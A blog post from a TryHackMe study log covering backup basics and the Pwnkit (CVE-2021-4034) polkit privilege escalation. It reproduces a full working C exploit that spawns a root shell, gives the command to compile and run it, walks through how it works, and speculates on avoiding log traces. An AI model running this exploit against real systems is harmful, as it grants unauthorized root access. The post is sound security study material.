@@ -1,0 +1,86 @@
+---
+title: 'TryHackMe: Common Attacks &amp; Pwnkit'
+date: 2022-02-03 06:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2022-02-03-tryhackme-common-attacks-and-pwnkit.html
+author: 100007
+---
+
+<h1 id="tryhackme-common-attacks--pwnkit">TryHackMe: Common Attacks &amp; Pwnkit</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2022-02-03</p>
+<h2 id="common-attacks">Common Attacks</h2>
+<h3 id="public-network-safety">Public Network Safety</h3>
+<p>I really do wish that guides like this would stop highlighting VPNs – their utility is just really unclear for most people anymore!</p>
+<h3 id="backups">Backups</h3>
+<p>“3, 2, 1” is a good mnemonic for backups:</p>
+<ul>
+<li>THREE or more copies</li>
+<li>TWO or more different storage devices</li>
+<li>ONE or more offsite backups</li>
+</ul>
+<p>Though honestly, this is kind of a “minimum viable backup” strategy, since simply using a cloud service to mirror data between two devices would qualify! (Why? Working data counts as a copy…)</p>
+<h2 id="pwnkit-cve-2021-4034">Pwnkit (CVE-2021-4034)</h2>
+<h3 id="exploitation">Exploitation</h3>
+<p>Quick-n-dirty Pwnkit exploit:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+* Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;
+* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
+*/</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">shell</span> <span class="o">=</span>
+<span class="s">"#include &lt;stdio.h&gt;</span><span class="err">
+</span><span class="s">"</span>
+<span class="s">"#include &lt;stdlib.h&gt;</span><span class="err">
+</span><span class="s">"</span>
+<span class="s">"#include &lt;unistd.h&gt;</span><span class="err">
+</span><span class="s">"</span>
+<span class="s">"void gconv() &#x007b;&#x007d;</span><span class="err">
+</span><span class="s">"</span>
+<span class="s">"void gconv_init() &#x007b;</span><span class="err">
+</span><span class="s">"</span>
+<span class="s">" setuid(0); setgid(0);</span><span class="err">
+</span><span class="s">"</span>
+<span class="s">" seteuid(0); setegid(0);</span><span class="err">
+</span><span class="s">"</span>
+<span class="s">" system(</span><span class="se">\"</span><span class="s">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh</span><span class="se">\"</span><span class="s">);</span><span class="err">
+</span><span class="s">"</span>
+<span class="s">" exit(0);</span><span class="err">
+</span><span class="s">"</span>
+<span class="s">"&#x007d;"</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">&#x007b;</span>
+<span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' &gt; pwnkit/gconv-modules"</span><span class="p">);</span>
+<span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"pwnkit/pwnkit.c"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span>
+<span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">shell</span><span class="p">);</span>
+<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC"</span><span class="p">);</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">&#x007b;</span> <span class="s">"pwnkit"</span><span class="p">,</span> <span class="s">"PATH=GCONV_PATH=."</span><span class="p">,</span> <span class="s">"CHARSET=PWNKIT"</span><span class="p">,</span> <span class="s">"SHELL=pwnkit"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">&#x007d;;</span>
+<span class="n">execve</span><span class="p">(</span><span class="s">"/usr/bin/pkexec"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">[])&#x007b;</span><span class="nb">NULL</span><span class="p">&#x007d;,</span> <span class="n">env</span><span class="p">);</span>
+<span class="p">&#x007d;</span>
+</code></pre></div></div>
+<p>The exploit is then as simple as <code class="language-plaintext highlighter-rouge">gcc $FILE -o exploit; ./exploit</code>.</p>
+<p>Here’s what basically happens on execution:</p>
+<ul>
+<li>The exploit creates the path <code class="language-plaintext highlighter-rouge">GCONV_PATH=.</code> in the current directory and adds an invalid executable file to it.</li>
+<li>The exploit creates a second directory called <code class="language-plaintext highlighter-rouge">pwnkit</code> and sets up a malicious shared library designed to be loaded by GLib to translate system messages to the made-up character set “PWNKIT”.</li>
+<li>The exploit calls <code class="language-plaintext highlighter-rouge">pkexec</code> with a NULL argument list (this bit is important, since we need the length of the argument list to be 0 – so, not even to contain the name of <code class="language-plaintext highlighter-rouge">pkexec</code> itself) <em>but</em> with a correctly set up (albeit malicious) environment via <code class="language-plaintext highlighter-rouge">execve()</code>. Importantly, the first “variable” in the environment is actually the name of the (invalid) executable in the <code class="language-plaintext highlighter-rouge">GCONV_PATH=.</code> directory.</li>
+<li>Polkit just falls through the loop that it would normally use to walk through the passed-in arguments. This causes what would be pointing to an executable name to instead point to the first environment variable that’s passed into <code class="language-plaintext highlighter-rouge">execve()</code>, which happens to be string <code class="language-plaintext highlighter-rouge">pwnkit</code>.</li>
+<li>Polkit looks up the malicious executable, finds it in <code class="language-plaintext highlighter-rouge">GCONV_PATH=./pwnkit</code> (because we set the PATH to that directory), and then tries to replace the executable name with this full path. <em>Except</em> that it’s still writing to the first element of the environment, which causes <code class="language-plaintext highlighter-rouge">pwnkit</code> to be replaced by <code class="language-plaintext highlighter-rouge">GCONV_PATH=./pwnkit</code>.</li>
+<li>Polkit the proceeds to sanitize its environment. When it comes to the invalid SHELL variable this sanitization fails and Polkit throws an error and dies. <em>But!</em> Before dying, Polkit tries to <em>print</em> the error using a GLib function that dutifully attempts to translate the message into the “PWNKIT” character set. To figure out how to do this, modules are loaded from GCONV_PATH… And we’ve defined a malicious module to do this that cleans up the exploit files and spawns a root shell (since <code class="language-plaintext highlighter-rouge">pkexec</code> is SUID root).</li>
+</ul>
+<p>A couple of points:</p>
+<ul>
+<li>This version of the exploit cleans up after itself, but does depend on generating a log message. The Qualsys advisory describing Pwnkit notes that “this vulnerability is also exploitable without leaving any traces in the logs, but this is left as an exercise for the interested reader.” My guess is that to do this you’d need to reintroduce a different environment variable that <code class="language-plaintext highlighter-rouge">ld.so</code> normally strips when calling SUID binaries. (At least, I don’t immediately see any place where Polkit is printing something that <em>isn’t</em> a warning before it nukes its own environment, but then I’m not super-familiar with C and am only quickly skimming the <code class="language-plaintext highlighter-rouge">pkexec</code> source code.) <em>Or</em> perhaps you can do something with the permissions of the <code class="language-plaintext highlighter-rouge">GCONV_PATH=./pwnkit</code> file to trigger an error that would not be logged. (The trick here would be to do something so that <code class="language-plaintext highlighter-rouge">g_find_program_in_path()</code> resolves <code class="language-plaintext highlighter-rouge">GCONV_PATH=./pwnkit</code> but <code class="language-plaintext highlighter-rouge">access()</code> returns an error; it’s not obvious to me how to do this though, or even if it <em>can</em> be done!)</li>
+<li>It took me a while to figure out why this exploit doesn’t occur when <code class="language-plaintext highlighter-rouge">pkexec</code> is called without any arguments, since it will still fall through the initial argument-parsing loop. The reason this doesn’t happen is that <code class="language-plaintext highlighter-rouge">argv[1]</code> is NULL in this case (the last element of <code class="language-plaintext highlighter-rouge">argv</code> is always the NULL pointer), so the first string of the environment isn’t wrongly loaded <em>and</em> and entirely separate code path is triggered before the <code class="language-plaintext highlighter-rouge">GCONV_PATH=./pwnkit</code> variable would have gotten written into the environment. (It’s worth noting that Debian derivatives seem to have removed the <code class="language-plaintext highlighter-rouge">sudo -s</code> like functionality from <code class="language-plaintext highlighter-rouge">pkexec</code> entirely, and just display a help message in this case.)</li>
+</ul>
+<p>References:</p>
+<ul>
+<li><a href="https://github.com/arthepsy/CVE-2021-4034">arthepsy / CVE-2021-4034</a></li>
+<li><a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">pwnkit: Local Privilege Escalation in polkit’s pkexec (CVE-2021-4034)</a></li>
+<li><a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/539bf5dcca489534f42798a4500aca4b1a8ec8d0/src/programs/pkexec.c">polkit / src / programs / pkexec.c (commit 539bf5dc)</a></li>
+</ul>
